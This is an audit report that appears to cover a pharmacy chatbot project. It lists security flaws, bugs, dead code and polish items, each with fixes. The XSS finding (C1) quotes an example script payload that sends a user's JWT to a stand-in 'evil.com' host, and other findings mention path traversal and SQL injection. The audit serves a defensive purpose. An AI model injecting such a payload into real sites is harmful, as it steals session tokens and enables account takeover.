# Project Issues — Full Scan

A complete audit of the Pharmacy Chatbot project. Issues are grouped by severity and category, with file paths, line numbers, root cause, and recommended fix.

**Legend:**
- 🔴 **Critical** — security risk, data loss, broken functionality
- 🟠 **High** — bugs that affect users or wrong results
- 🟡 **Medium** — code smell, dead code, performance concern
- 🔵 **Low** — polish, naming, minor improvements

---

## 🔴 CRITICAL — Security

### C1. XSS vulnerability — LLM/PDF content rendered as raw HTML
**File:** `frontend/src/pages/ChatPage.jsx:30-32, 76, 86`

The chat message content is converted to HTML with a simple regex and rendered via `dangerouslySetInnerHTML` **without sanitization**:

```js
const htmlContent = (msg.content || '')
  .replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>')
  .replace(/\n/g, '<br/>');
// ...
<div dangerouslySetInnerHTML={{ __html: htmlContent }} />
```

**Risk:** If a PDF contains text like `<script>fetch('https://evil.com?t='+localStorage.getItem('pharmacy_token'))</script>`, or if an attacker performs prompt injection on the LLM, this code will execute in every admin/user's browser and **leak their JWT token**.

**Fix:**
1. Escape HTML special chars (`<`, `>`, `&`, `"`, `'`) **before** applying the bold/newline regex.
2. Or better: use a small library like `marked` + `DOMPurify`, or simply render plaintext with `white-space: pre-wrap` and use `<strong>` via JSX matching instead of `innerHTML`.

---

### C2. JWT secret default is weak and committed
**File:** `backend/app/config.py:9`, `.env.example:5`

```python
JWT_SECRET_KEY = os.getenv("JWT_SECRET_KEY", "change-this-secret-in-production-please")
```

If a deployer forgets to set `JWT_SECRET_KEY`, the app silently runs with a publicly-known secret — anyone can forge admin JWTs.

**Fix:**
- In `main.py`, after `load_dotenv`, refuse to start if `JWT_SECRET_KEY` is missing **or** equal to the default placeholder.
- Or generate a random key on first run and warn loudly.

---

### C3. No upload size limit + weak file validation
**File:** `backend/app/routers/documents.py:22-38`

```python
if not file.filename or not file.filename.lower().endswith(".pdf"):
    return ...rejected...
```

Issues:
1. **No size limit** — an attacker can upload a 10GB file, fill the disk, exhaust embedding API quota.
2. **No content validation** — only checks the extension; any binary file renamed `whatever.pdf` will be accepted and crash PyPDF2 later.
3. **Filename traversal** — `file.filename` is used as-is in `Path(file.filename).suffix` and as the SQL `filename`. A name like `../../etc/passwd.pdf` is technically valid for the DB row even though it doesn't touch disk here.

**Fix:**
- Add `MAX_UPLOAD_BYTES = 20 * 1024 * 1024` constant; reject larger files with HTTP 413.
- Read the first 4 bytes of the upload and require `b"%PDF"` magic signature.
- Sanitize `file.filename` with `Path(file.filename).name` (strips any path components) before storing.

---

### C4. Rate limiter is global, not per-user
**File:** `backend/app/services/rate_limiter.py`, `backend/app/services/rag_service.py:168`

```python
self._request_times: deque = deque()
```

The rate limiter holds a single deque shared across all users. **One abuser blocks everyone**, and 20 different admins making one request each will trigger the limit.

**Fix:** Key the deque by `admin_id`/`user_id`:
```python
self._request_times: dict[int, deque] = defaultdict(deque)
def check(self, principal_id: int) -> bool: ...
```
Then plumb `admin_id` through `RAGService.predict` (it's already passed for analytics).

---

### C5. CORS allow-list is dev-only — production breaks
**File:** `backend/app/main.py:114-124`

```python
allow_origins=[
    "http://localhost:5173",
    "http://localhost:5174",
    "http://localhost:5175",
    "http://localhost:3000",
]
```

When deployed behind a real domain (e.g. `https://aspira.example.com`), the browser sees a CORS rejection. The Docker frontend works because nginx proxies same-origin, but any deployment that hits the API from a different origin fails.

**Fix:** Read allowed origins from `CORS_ORIGINS` env var, comma-separated. Default to localhost only in dev mode.

---

### C6. JWT type defaults to "admin" on missing field — silent privilege issue
**File:** `backend/app/dependencies.py:24, 78`

```python
if payload.get("type", "admin") != "admin":
```

The comment says "Tokens issued before the type field was added default to admin for backwards compatibility." There are no such tokens — the project always emits `type`. This default is a footgun: any future code path that issues a token without `type` becomes an admin token by accident.

**Fix:** Remove the default. Require the field explicitly:
```python
if payload.get("type") != "admin":
    raise HTTPException(...)
```

---

## 🔴 CRITICAL — Functional Bugs

### C7. Inconsistent `principal_type` vs `principalType`
**Files:**
- `backend/app/dependencies.py:88, 96` → returns `principal_type` (snake_case)
- `frontend/src/services/api.js:44, 49, 67, 72` → returns `principalType` (camelCase)
- `backend/app/routers/chat.py:42` → reads `principal["principal_type"]`
- `frontend/src/contexts/AuthContext.jsx:46-49` → reads `principal.principalType`

The backend Python uses `principal_type`, the frontend JS uses `principalType`. Both happen to work today because each side **manually constructs** the key on its own (api.js adds `principalType` after the API call). But this is fragile — any code that uses `principal["principalType"]` on the backend or vice versa silently returns undefined.

**Fix:** Standardize on one (`principal_type` since that matches Python convention). Update `AuthContext`, `ProtectedRoute`, `ChatPage`, and `api.js` to read the snake_case form.

---

### C8. `DocumentsPage` total chunks always reads 0
**File:** `frontend/src/pages/DocumentsPage.jsx:83`

```js
const totalChunks = docs.reduce((s, d) => s + (d.chunk_count ?? 0), 0);
```

The `DocumentInfo` schema (`backend/app/schemas/documents.py:14-20`) doesn't include `chunk_count`. The reducer always sees `undefined`, so `totalChunks` is always `0`. The top bar shows `"... · 0 chunks indexed in FAISS"` regardless of reality.

**Fix:** Either:
- Add `chunk_count` to `DocumentInfo` and the DB query (`SELECT ... COUNT(c.id) FROM documents d LEFT JOIN chunks c ON c.document_id = d.id GROUP BY d.id`)
- Or fetch the global total via `/api/health` (which already returns `chunks`) and display that instead.

---

### C9. Analytics donut chart math is wrong
**File:** `frontend/src/pages/AnalyticsPage.jsx:172-174`

```jsx
<circle ... strokeDasharray={`${langEn} 100`} strokeDashoffset="25" .../>
<circle ... strokeDasharray={`${langAr} 100`} strokeDashoffset={`-${langEn - 0}`} .../>
```

The first arc starts at 12 o'clock (offset 25) and spans `langEn` percent clockwise. The second arc should start where the first ended: offset `25 - langEn`. The current code uses `-langEn` which means it starts at the **3 o'clock + langEn** position — the Arabic segment is rotated 90° wrong and overlaps the English segment.

Also: `langEn - 0` is just `langEn` — the `- 0` is a leftover.

**Fix:**
```jsx
strokeDashoffset={25 - langEn}
```

---

### C10. Fake upload progress bar
**File:** `frontend/src/pages/DocumentsPage.jsx:43`

```js
const interval = setInterval(() => setUploadPct(p => Math.min(p + 12, 90)), 300);
```

The progress bar is a `setInterval` lie — it climbs at a fixed rate independent of the actual upload. A 5MB upload and a 50MB upload show the same animation. Worse: when embeddings are slow (the real bottleneck), the bar sits at 90% for a long time and the user thinks something is broken.

**Fix:** Either:
- Use `XMLHttpRequest` `upload.onprogress` to track real bytes (true progress).
- Or just show an indeterminate spinner with "Uploading… Embedding…" text — honest is better than fake.

---

### C11. Dashboard quick-action route `/admins` works only for Master Admin
**File:** `frontend/src/pages/DashboardPage.jsx:152-154`

```js
['users',  'Invite an admin',   'Master Admin only',     '/admins'],
```

The link is shown to every admin, but `ProtectedRoute requireAdmin` accepts non-master admins through. They navigate to `/admins`, the API returns 403, the page shows an empty table with no feedback that it's not allowed.

**Fix:** Wrap the row in `{role === 'master_admin' && ...}` so it only renders for masters. The sidebar already does this — the dashboard should too.

---

### C12. Two old test files reference deleted top-level modules
**File:** `tests/conftest.py` (root), `tests/test_config.py`, `tests/test_database.py`

The `git status` at session start shows these as **deleted in working tree** but still present in HEAD. The active tests live under `backend/tests/`. The duplicated root `tests/` dir confuses CI and IDEs. The deleted files are still committed and will resurrect on the next `git checkout` of an old branch.

**Fix:** Properly remove the root `tests/`, `Chatbot.py`, `config.py`, `database.py`, `ingest.py`, `pharmacy.db`, `pharmacy.faiss*`, `requirements.txt`, `pytest.ini`, `Dockerfile`, `Aspirin.pdf`, `Medic.pdf` from git. Run `git rm` and commit. They are leftovers from the pre-restructure Gradio app.

---

## 🟠 HIGH — Dead Code

### H1. Five frontend files are unused
**Files:**
- `frontend/src/components/MessageBubble.jsx` — 47 lines
- `frontend/src/components/ChatInput.jsx` — 80 lines
- `frontend/src/components/ChatWindow.jsx` — 104 lines
- `frontend/src/components/Sidebar.jsx` — 58 lines (the OLD one, **not** the working `layout/Sidebar.jsx`)
- `frontend/src/hooks/useChat.js` — 93 lines

All five use **Tailwind classes** (the project removed Tailwind in Phase 2). `useChat` calls `streamChat(text, history)` with the old 2-arg signature — the real API is `streamChat(text, sessionId, history)`. `ChatWindow` is the only consumer; nothing imports `ChatWindow`. So all five are dead.

**Fix:** Delete all five files.

---

### H2. Unused backend service — `TranscriptionService`
**File:** `backend/app/services/transcription_service.py` (26 lines)

Voice transcription was a planned feature. No router uses it. No frontend page sends audio. The service ships but is never instantiated.

**Fix:** Either wire up an `/api/transcribe` endpoint + frontend mic button, or delete the file.

---

### H3. Dead "Export CSV" button in Analytics
**File:** `frontend/src/pages/AnalyticsPage.jsx:82`

```jsx
<button className="pc-btn pc-btn-secondary"><Icon name="download" size={14} /> CSV</button>
```

No `onClick`. Clicking does nothing. Users will think the page is broken.

**Fix:** Either implement CSV export (front-end can build it from the analytics data), or remove the button until ready.

---

### H4. Dead `extracted/` directory at project root
**File:** `Medical_ChatBot_extracted/` (and `Medical_ChatBot.zip`)

The `git status` shows these as untracked. They were the design source-of-truth during prototyping but no longer needed.

**Fix:** Move into `docs/design-refs/` if still valuable, or delete and reference via Git history.

---

## 🟠 HIGH — Database & Performance

### H5. `f-string` SQL with `days` parameter
**File:** `backend/app/database.py:431, 435-455, 466-468, 483-491, 502-503`

```python
cutoff = f"datetime('now', '-{days} days')"
total = db.execute(f"... WHERE created_at >= {cutoff}").fetchone()
```

`days` is currently validated upstream by the regex `7d|30d|90d`, but this is **defense-in-depth violation**: future refactors might pass `days` from a less-validated path and introduce SQL injection. SQLite supports parameterized date math.

**Fix:**
```python
cutoff_dt = f"-{days} days"
db.execute(
    "SELECT COUNT(*) FROM analytics WHERE created_at >= datetime('now', ?)",
    (cutoff_dt,),
)
```

---

### H6. `get_all_chunks()` loads every chunk into memory on startup
**File:** `backend/app/services/rag_service.py:62-65, 107-110`, `backend/app/database.py:354-361`

```python
rows = get_all_chunks()
self.contents = [r[1] for r in rows]
self.sources  = [r[3] for r in rows]
```

Each chunk row has `(id, content ~1KB, embedding 6KB BLOB, filename)`. With 100 PDFs × 60 chunks, that's ~42MB held in RAM **per worker process** plus a parallel copy as `self.contents`/`self.sources` lists. This doesn't scale; on the upload code path, it also re-runs the entire load (`reload_index` calls `get_all_chunks` again, doubling the peak).

**Fix:**
- Store only the index `(content, source)` mapping using arrays of `numpy.uint64` row pointers; fetch the actual `content` lazily via a second SQL hit per retrieval (only top-4 needed).
- Or stream the rows into the FAISS matrix without keeping the Python list intact.

---

### H7. Connection-per-call pattern, no pooling
**File:** `backend/app/database.py:12-24`

Every helper opens a fresh SQLite connection. SQLite is fine for low traffic, but:
- WAL mode is set per connection — each call pays that cost.
- `init_db()` bypasses the context manager and doesn't set WAL on the init path.
- High-frequency analytics endpoint (`get_analytics_rich`) opens **8 connections** in a single request because each `_connect()` `with` block is separate inside a single function — wait, actually `get_analytics_rich` does open them in **one** `with` block. False alarm on that one. But `chat.py` makes 3+ connections per request: session lookup, add user message, then later add assistant message.

**Fix:** Reuse a per-request connection. Or accept the cost for now and document it. SQLite is OK at this scale; the bigger issue is that there's no `PRAGMA synchronous=NORMAL` set, so every write pays an `fsync`.

---

### H8. Blocking I/O inside async endpoints
**Files:**
- `backend/app/routers/documents.py:22-81` (`async def upload_document`) — calls `process_file` which does `embeddings.embed_documents(chunks)`, a blocking HTTPS call to OpenAI inside the event loop.
- `backend/app/routers/chat.py:25-30` (`async def chat`) — calls `_create_session`, `_get_session`, `_add_message` (all blocking SQLite) before returning the streaming response.
- `backend/app/routers/sessions.py:21-44`, `backend/app/routers/user_sessions.py` — all `async def` that immediately call sync DB code.

When any sync call blocks (DB lock, slow OpenAI), the entire event loop stalls — other requests freeze.

**Fix:**
- Either remove `async` and use `def` (FastAPI runs sync endpoints in a threadpool automatically).
- Or wrap blocking calls in `await run_in_threadpool(...)`.
- Same for the long upload: `await run_in_threadpool(process_file, ...)`.

---

### H9. `get_chat_messages` orders by TEXT timestamp
**File:** `backend/app/database.py:286, 629`

```sql
SELECT ... FROM chat_messages WHERE session_id = ? ORDER BY created_at
```

`created_at` is TEXT. SQLite text comparison happens to work because the ISO-8601 format sorts lexicographically. But this only works as long as the format never changes (e.g., no timezone, no microseconds). For a single session with messages added in the same second, ordering can flip.

**Fix:** `ORDER BY id` is monotonic and free (already the PK).

---

### H10. Missing indexes on hot paths
**Files:** `backend/app/database.py:132-141`

The schema indexes admin/user lookups but **misses**:
- `analytics.admin_id` — `get_analytics_rich` filters by admin (future feature)
- `documents.file_hash` — used by `document_exists_by_hash` for dedup
- `chunks.document_id` is indexed ✓
- `documents.created_at` — `ORDER BY created_at` in `get_all_documents()`

**Fix:** Add `CREATE INDEX IF NOT EXISTS idx_documents_hash ON documents(file_hash);` and `idx_documents_created ON documents(created_at);`.

---

## 🟠 HIGH — Frontend

### H11. Stale-closure history bug in `ChatPage.handleSend`
**File:** `frontend/src/pages/ChatPage.jsx:178-257`

```js
async function handleSend() {
  // ...
  const userMsg = { role: 'user', content: text, ... };
  setMessages(prev => [...prev, userMsg]);
  // ...
  const history = messages.map(m => ({ role: m.role, content: m.content }));
```

`messages` here is the **closure-captured** value from this render. The just-appended `userMsg` is *not* in `history`. This is actually intentional (the user message is the new `query`, not history), but the comment is wrong and it's easy to break later. Also: the placeholder push uses the *closure* `messages`, so two rapid `handleSend` calls will produce wrong history.

**Fix:** Pass `history` as an argument to a stable callback, or compute it from `prev` inside the same `setMessages` updater.

---

### H12. SSE response: token uniqueness check is absent
**File:** `frontend/src/pages/ChatPage.jsx:201-213`

```js
for await (const event of streamChat(text, currentSessionId, history)) {
  if (event.token !== undefined) {
    setMessages(prev => {
      const msgs = [...prev];
      msgs[msgs.length - 1] = { ...botPlaceholder, content: event.token };
      return msgs;
    });
  }
```

Each `event.token` is the **cumulative** text (intentional, per `chat.py:79-80`). But `msgs[msgs.length - 1]` is always assumed to be the placeholder. If the user clicks "New chat" or selects another session mid-stream, the bot reply gets written into the wrong session.

**Fix:** Hold a stable `streamingSessionId` ref. On every token, verify `currentSessionId === streamingSessionId` before mutating, or use `abortRef` to cancel the loop on session change.

---

### H13. `streamChat` ignores `abortRef`
**File:** `frontend/src/pages/ChatPage.jsx:117, 178-257`, `frontend/src/services/api.js:133-176`

```js
const abortRef = useRef(false);
// ...
if (abortRef.current) break;
```

This only breaks the JS `for await` loop — the underlying `fetch` keeps streaming, OpenAI keeps charging, the backend keeps writing the assistant message. There's no `AbortController` plumbed into `streamChat`.

**Fix:** Add `AbortController` support:
```js
export async function* streamChat(message, sessionId, history, signal) {
  const res = await fetch('/api/chat', { ..., signal });
```
Then `abortRef = useRef(new AbortController())` in the page; call `.abort()` to truly stop.

---

### H14. ErrorBoundary missing
**Files:** `frontend/src/App.jsx`, every page

A render error in any page bubbles to React's default error screen — white page, no recovery. For a CV demo, a single bad row crashes the whole app.

**Fix:** Add an `<ErrorBoundary>` at the App level that catches and shows a recovery card with a "Reload" button.

---

### H15. `messages.map` uses array index as key
**File:** `frontend/src/pages/ChatPage.jsx:420-422`

```jsx
{messages.map((msg, i) => (
  <Message key={i} msg={msg} initials={initials} />
))}
```

Index keys mean: when the streaming placeholder mutates each token, React reconciles content into the wrong DOM nodes. It works because the array only grows, but if a deletion is added later, animation/focus state will jump.

**Fix:** Generate a stable `id` per message (e.g., `crypto.randomUUID()` when pushed) and key on that.

---

### H16. Settings: profile email is editable but never saved
**File:** `frontend/src/pages/SettingsPage.jsx:97-105`

```jsx
<input className="pc-input" defaultValue={admin?.email ?? ''} placeholder="your@email.com" />
```

No `onChange`, no submit handler — the input is purely decorative. User types a new email, clicks away, data is lost.

**Fix:** Either add a backend `PATCH /api/auth/me` endpoint and a save button, or make the input `disabled` until that's built.

---

### H17. Sidebar `Date.now()` analytics call is unused
**File:** `frontend/src/pages/DashboardPage.jsx:48-51`

```js
useEffect(() => {
  getAnalytics('7d').then(setStats).catch(() => {});
  getHealth().then(setHealth).catch(() => {});
}, []);
```

This is fine, but `getHealth()` requires no auth and returns `{ status, docs, chunks }`. The dashboard uses both `stats.doc_count` and `health.docs`/`health.chunks` — duplicate fetch. Could just use `getAnalytics` since it returns `doc_count` and `chunk_count` too.

**Fix:** Drop `getHealth()` here; use `stats.doc_count` and `stats.chunk_count`.

---

### H18. Session search input is non-functional
**File:** `frontend/src/pages/ChatPage.jsx:293-301`, `DocumentsPage.jsx:108-110`

Both pages have an `<input placeholder="Search history…" />` (or "Search documents…") with no `onChange`, no filter state. The input accepts text but nothing is filtered.

**Fix:** Wire up local-state filter:
```js
const [filter, setFilter] = useState('');
// ...
sessions.filter(s => s.title.toLowerCase().includes(filter.toLowerCase()))
```

---

## 🟡 MEDIUM — Code Quality

### M1. `principalType` plumbing inconsistency
**Files:** `frontend/src/contexts/AuthContext.jsx`, `frontend/src/pages/ChatPage.jsx:103-105`

```js
const role = userRole ? 'user'
           : (principal?.principalType === 'user' ? 'user'
                                                  : (principal?.role ?? 'admin'));
```

This 3-level ternary is hard to read because the `userRole` boolean prop, the `principalType`, and the admin `role` field all encode similar info. Document or refactor into a `useRole()` hook.

---

### M2. Backend tests skip the API layer
**File:** `backend/tests/` (62 tests pass)

Tests cover config + database. **No tests** for:
- Auth login / JWT verification
- Chat endpoint SSE behavior
- Admin CRUD endpoints
- Permission enforcement (admin vs master)

For a CV-quality project, having `pytest` + FastAPI's `TestClient` integration tests would significantly improve confidence.

**Fix:** Add `tests/test_routers/test_auth.py`, `test_chat.py`, `test_documents.py`. Mock `OpenAIEmbeddings` with `respx` or simple monkeypatch.

---

### M3. Hardcoded English strings everywhere
**File:** all `frontend/src/pages/*.jsx`

```jsx
<div>...Sign in</div>
<div>Welcome back</div>
<div>Knowledge base healthy</div>
```

The chatbot supports Arabic responses but the UI is English-only. Adding `i18next` would let the whole app flip with the user's language.

**Fix:** Out of scope for v1; document as a known limitation.

---

### M4. `useEffect` deps lint suppressions
**Files:** `AnalyticsPage.jsx:46`, `ChatPage.jsx:135`

```js
// eslint-disable-next-line react-hooks/exhaustive-deps
useEffect(() => { loadAnalytics(); }, [period]);
```

Suppressed because `loadAnalytics` is hoisted. Clean version:

```js
useEffect(() => {
  let cancelled = false;
  getAnalytics(period).then(d => !cancelled && setData(d)).catch(() => {});
  return () => { cancelled = true; };
}, [period]);
```

---

### M5. Repeated avatar/initials logic
**Files:** every page (`AdminsPage.jsx:13`, `DashboardPage.jsx:45`, `ChatPage.jsx:107`, `DocumentsPage.jsx:12-14`, `SettingsPage.jsx:38`)

```js
const initials = name.slice(0, 2).toUpperCase();
```

Identical in 6 places. Should be `useCurrentPrincipal()` hook or pulled into a `useAuth()` extension.

---

### M6. Card title prop type loose
**File:** `frontend/src/components/ui/Card.jsx`

No prop-types or TS. Wrong types fail silently.

**Fix:** Migrate to TypeScript (or add a JSDoc `@typedef`).

---

### M7. Duplicated session/message DAL code
**File:** `backend/app/database.py:232-296` (admin) vs `579-638` (user)

The user and admin session functions are 99% identical — same SQL with different table names. A small abstraction would halve the code:

```python
def _make_session_dal(session_table, message_table, owner_col):
    def create(...): ...
    def get(...): ...
    return create, get, ...
```

Or use a single polymorphic table with a `principal_type` column. For now this is fine but it's a code smell.

---

### M8. Backend log file path is broken on Windows
**File:** `backend/app/main.py:28-39`

```python
LOG_DIR = ROOT_DIR / "logs"
LOG_DIR.mkdir(exist_ok=True)
```

`ROOT_DIR = backend/app/../..` so logs go in `backend/logs/`. Fine when running locally. But the Docker volume maps `./backend/logs:/app/logs` — works. The issue: when `backend/logs` doesn't exist and the dev didn't run `mkdir`, logging silently writes nowhere on some Windows configs because `parents=True` is not set.

**Fix:** `LOG_DIR.mkdir(parents=True, exist_ok=True)`.

---

### M9. `set_admin_active` doesn't check existence
**File:** `backend/app/database.py:220-222`

```python
def set_admin_active(admin_id: int, is_active: bool) -> None:
    with _connect() as db:
        db.execute("UPDATE admins SET is_active = ? WHERE id = ?", (int(is_active), admin_id))
```

If `admin_id` doesn't exist, the function silently succeeds (0 rows affected). The caller in `auth.py:101` does a `get_admin_by_id` first — so the bug is masked. But that pattern is fragile across two function calls without a DB transaction.

**Fix:** Return `cursor.rowcount`; caller checks `if rowcount == 0: raise 404`.

---

### M10. `transcribe()` swallows errors silently
**File:** `backend/app/services/transcription_service.py:23-25`

```python
except Exception as e:
    log.error(f"Transcription error: {e}")
    return ""
```

Returns empty string indistinguishable from "no audio". (Moot if H2 deletes the file.)

---

### M11. `LoginPage` "Keep me signed in" checkbox does nothing
**File:** `frontend/src/pages/LoginPage.jsx:159-162`

```jsx
<input type="checkbox" defaultChecked style={{ accentColor: 'var(--pc-primary)' }} />
Keep me signed in for 8 hours
```

The token already lives 8 hours regardless. Unchecking the box has no effect.

**Fix:** Either implement actual logic (use `sessionStorage` instead of `localStorage` when unchecked), or remove the checkbox.

---

### M12. AnalyticsPage falls back to fake data when API returns 0
**File:** `frontend/src/pages/AnalyticsPage.jsx:47, 51-57`

```js
const bars = data?.daily_counts ?? [22,28,24,...];
const totalQueries = data?.total ?? 3847;
const cachedResponses = data?.cached ?? 892;
```

`??` triggers fallback only when the API returns `null`/`undefined`. For a fresh install with `total: 0`, the dashboard shows `3847` queries. That's a fake-data lie.

**Fix:** Test on `data == null` not on the field, or default the fallback to zeros:
```js
const totalQueries = data?.total ?? 0;
```

---

### M13. `init_db` runs `executescript` outside the context manager
**File:** `backend/app/database.py:34-151`

```python
def init_db():
    DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(str(DB_PATH))
    conn.execute("PRAGMA foreign_keys = ON")
    conn.executescript("""...""")
    conn.commit()
    conn.close()
```

Doesn't set `PRAGMA journal_mode = WAL` like `_connect()` does. So the very first connection writes the DB header in rollback-journal mode; subsequent connections upgrade to WAL. Inconsistent.

**Fix:** Call `conn.execute("PRAGMA journal_mode = WAL")` in `init_db` too. Or simply replace with `with _connect() as conn: conn.executescript(...)`.

---

## 🔵 LOW — Polish

### L1. README references files that no longer exist
**File:** `README.md:163-180`

The project structure tree is accurate after Phase 6 rewrite, but `frontend/src/components/` lists only `Icon`, `Card`, `Toast` — missing the dead-code files (which should be deleted anyway, see H1).

---

### L2. `pc-r-sm`, `pc-r-xl` defined but unused
**File:** `frontend/src/design-system.css:49-52`

Tokens declared, never referenced anywhere in the codebase. Either start using them or remove.

---

### L3. Mobile chat layout: sidebar drawer breakpoint missing
**File:** `frontend/src/design-system.css:640+`

```css
@media (max-width: 640px) {
  .pc-chat-sidebar { ... }
  .pc-chat-sidebar.pc-chat-sidebar-open { ... }
}
```

The `pc-chat-sidebar-open` class is defined in CSS but no JS ever adds it. The mobile chat sidebar is permanently off-screen.

**Fix:** Add a `useState` in `ChatPage` for `chatSidebarOpen` and a hamburger inside the chat header.

---

### L4. `.dockerignore` excludes `*.md`
**File:** `.dockerignore:21`

```
*.md
ideas.md
```

This blocks `README.md` from the Docker image — fine — but also blocks any future docs for live API descriptions if added. Document intent.

---

### L5. `frontend/Dockerfile` doesn't pin Node version
**File:** `frontend/Dockerfile:1`

```dockerfile
FROM node:20-alpine AS build
```

`node:20-alpine` floats to the latest minor. For reproducible builds use `node:20.19.0-alpine` or `node:20-alpine3.20`.

---

### L6. Empty-catch comments inconsistent
**Files:** `AdminsPage.jsx:29`, `AnalyticsPage.jsx:44`, `ChatPage.jsx:135, 174`, `DocumentsPage.jsx:32`, `api.js:174`

```js
} catch { /* noop — sidebar silently stays empty on network error */ }
} catch { /* noop */ }
} catch { /* skip malformed trailing line */ }
```

Three different wording styles. Some explain why, some don't. Standardize.

---

### L7. Session deletion on chat thread does nothing safely
**File:** `frontend/src/pages/ChatPage.jsx:408-412`

```jsx
<button ... onClick={e => currentSessionId && handleDeleteSession(e, currentSessionId)}>
```

No confirmation modal. One accidental click and the entire conversation history is gone. SweetAlert2 or a simple `confirm()` would be enough.

---

### L8. Toast `info` icon uses bell, but `success` icon uses check — `warn` icon uses alert (same as error)
**File:** `frontend/src/components/ui/Toast.jsx:7-12`

```js
const ICONS = {
  success: 'check',
  error:   'alert',
  warn:    'alert',
  info:    'bell',
};
```

Visually a warning and an error look identical (same icon). Consider adding a dedicated `triangle-alert` icon for warnings.

---

### L9. `Card` component: `padded={false}` adds inline `style={{padding:0}}`
**File:** `frontend/src/components/ui/Card.jsx:13`

```jsx
<div className={padded ? 'pc-card-body' : ''} style={!padded ? { padding: 0 } : undefined}>
```

The inline style is redundant — when `padded={false}`, no class is applied so no padding exists. Remove the inline override.

---

### L10. Bot streaming cursor placement
**File:** `frontend/src/pages/ChatPage.jsx:87-89, 458-460`

The blinking cursor `▌` uses inline styles + a CSS keyframe defined at the bottom of the file via `<style>{...}` JSX. That keyframe should live in `design-system.css` so it can be reused. Also `animation: blink .7s step-end infinite` runs continuously even after streaming ends if `isStreaming` is set wrongly.

---

### L11. `vite.config.js` exposes proxy only at `localhost:8000`
**File:** `frontend/vite.config.js:9-11`

Hardcoded; if the backend runs on a different port for some reason, the dev server breaks. Use `process.env.VITE_API_URL` with fallback.

---

### L12. SSE `done` event sources parsing assumes specific format
**File:** `backend/app/routers/chat.py:85-90`

```python
if "*Sources:" in last_token:
    parts = last_token.rsplit("*Sources:", 1)
```

Coupling: the LLM template (`rag_service.py:233`) hard-codes `*Sources: {list}*` and the chat router parses that string back to extract `sources`. A small change in either place silently breaks the source pills in the UI.

**Fix:** Return `cited_sources` from `RAGService.predict` as a structured value (last yield = dict, or use a different mechanism like a side-channel attribute on the generator).

---

## Summary

| Severity | Count |
|----------|------:|
| 🔴 Critical | 12 |
| 🟠 High | 18 |
| 🟡 Medium | 13 |
| 🔵 Low | 12 |
| **Total** | **55** |

### Suggested fix order

1. **Security first:** C1 (XSS), C2 (JWT default), C3 (upload limits), C4 (per-user rate limit), C6 (JWT type default).
2. **Critical bugs:** C7 (principal_type), C8 (totalChunks=0), C9 (donut math), C11 (admins link), C12 (delete leftover files).
3. **Dead code:** H1 (5 frontend files), H2 (transcription), H3 (CSV button), H4 (extracted/).
4. **Backend hardening:** H5 (param SQL), H8 (blocking I/O), H10 (indexes).
5. **Frontend correctness:** H11 (stale closures), H12 (streaming session check), H13 (real abort), H16 (settings email).
6. **Polish + UX:** the rest.

Each issue lists file + line, root cause, and the recommended fix so you can tackle them one at a time.
